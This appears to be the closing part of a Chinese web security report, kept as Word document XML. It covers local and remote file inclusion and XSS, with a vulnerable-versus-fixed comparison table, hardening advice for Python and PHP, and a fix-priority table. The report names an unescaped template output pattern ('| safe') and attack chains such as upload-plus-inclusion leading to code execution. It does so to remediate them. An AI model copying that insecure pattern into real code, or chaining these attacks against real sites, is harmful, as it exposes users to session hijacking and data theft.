              <w:t>不限制</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>白名单 .html 或全限定</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>XSS输出</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>{{ content | safe }}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>移除safe或bleach过滤</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>文件白名单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ALLOWED_PAGES 白名单</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>十、安全建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.1 开发阶段</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1. 使用白名单机制限制可包含的文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2. 禁止用户输入直接拼接到文件路径</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>3. 使用 os.path.realpath 校验最终路径</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>4. 模板输出使用自动转义，不轻易使用 | safe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>5. 上传功能与文件包含功能不能形成闭环</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.2 PHP 环境专项</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1. 设置 allow_url_include = Off（禁止RFI）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2. 设置 open_basedir 限制文件访问范围</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>3. 禁用危险的 PHP 流封装器（php://）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>4. 对 include/require 参数使用白名单</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.3 运维监控</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1. 监控异常文件访问请求（大量 ../ 请求）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2. 部署 WAF 拦截路径遍历攻击</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>3. 定期扫描文件系统检查异常文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>4. 上传目录禁止执行权限</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10.4 修复优先级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P0 立即</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>LFI路径遍历</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>源代码/数据库泄露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P0 立即</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>XSS + LFI组合</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>会话劫持/权限提升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P1 紧急</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>文件上传+LFI闭环</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>远程代码执行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P1 紧急</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>RFI替代攻击</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>任意文件读取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